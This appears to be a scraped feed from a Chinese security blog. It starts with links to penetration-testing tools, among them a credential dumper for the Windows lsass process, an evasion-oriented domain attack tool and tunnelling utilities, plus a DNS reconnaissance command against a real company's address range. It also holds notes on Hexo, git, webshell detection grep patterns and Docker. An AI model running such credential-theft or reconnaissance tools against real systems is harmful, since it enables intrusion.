https://github.com/Hackplayers/evil-winrmsmb服务探测smb服务连接多种windows服务探测利用、域渗透综合工具，滥用内置的Active Directory特性/协议来实现它的功能，并允许它逃避大多数端点保护/id/IPS 解决方案。Chisel 是一个快速 TCP/UDP 隧道，通过 Websocket 传输，使用 SSH 加密协议进行连接。
https://mp.weixin.qq.com/s/p3daOf_zR_NYq5bRsujWgA
https://github.com/fortra/impacket# kali apt install impacket-scripts
https://ocr.kgtools.cn/dns反解dnsrecon -d facebook.com -r 157.240.221.35/24 -n 1.1.1.1
https://github.com/owasp-amass/amass
https://github.com/projectdiscovery/shuffledns
https://github.com/lgandx/Responder.git用来导出lsass进程中的凭据
https://github.com/login-securite/lsassy.git内网扫描
https://github.com/chainreactors/gogo

item.title: pagefind 搜索
hexo
item.description: 1.安装nodejs，最好高一点版本，自带npm 2.安装hexonpm install -g hexo-cli 3.初始化cd al0neme.github.io hexo init 4.本地部署hexo clean hexo g hexo s 5.远程部署 安装部署插件npm install hexo-deployer-git 修改配置文件_config.yml# Deployment ## Docs: https://hexo.io/docs/one-command-deployment deploy: type: '' 执行hexo clean hexo g hexo d

item.title: git
item.description: git 推送项目到github 先克隆项目到本地 git clone https://github.com/Al0neme/al0neme.github.io.git 修改项目后，添加远程地址 git remote add origin https://github.com/Al0neme/al0neme.github.io.git 把所有文件添加到本地仓库缓存区 git add . 提交并补充说明 git commit -m "init" 推送到远程仓库main分支 git push origin main 更新项目到本地 git pull 自动备份bat脚本 @echo off cd %cd% echo currentDirectory: %cd% git add . git commit -m "update" git push -u origin master pause 自动备份shell脚本 #!/bin/bash path=$(pwd) echo "current path: "$path git add . git commit -m "update" git push origin master echo "push completed"

item.title: 应急响应-webshell查杀
item.description: 打包网站目录后扫描就行tar -czvf src.tar.gz ./* 切换到网站目录，查询匹配常用语句find ./ -name "*.php" | xargs grep "eval(" 主要通过搜索常用变换函数查找，比如base64相关的find ./ -name "*.php" | xargs grep "base64_decode"
item.link: 应急响应（玄机靶机）/应急响应-webshell查杀.html
item.guid: 应急响应（玄机靶机）/应急响应-webshell查杀.md

item.title: Docker
item.description: sudo service docker start 查找 .dockerenv 文件 ls -al /.dockerenv 查找 cgroup 进程 cat /proc/1/cgroup sudo docker cp test.txt 938aa6e51da1:/tmp/test.txt sudo docker run --rm -it --entrypoint=/bin/sh 938aa6e51da1 # 注意/bin/sh需要容器有，如果容器是/bin/bash，则--entrypoint参数值换成/bin/bash
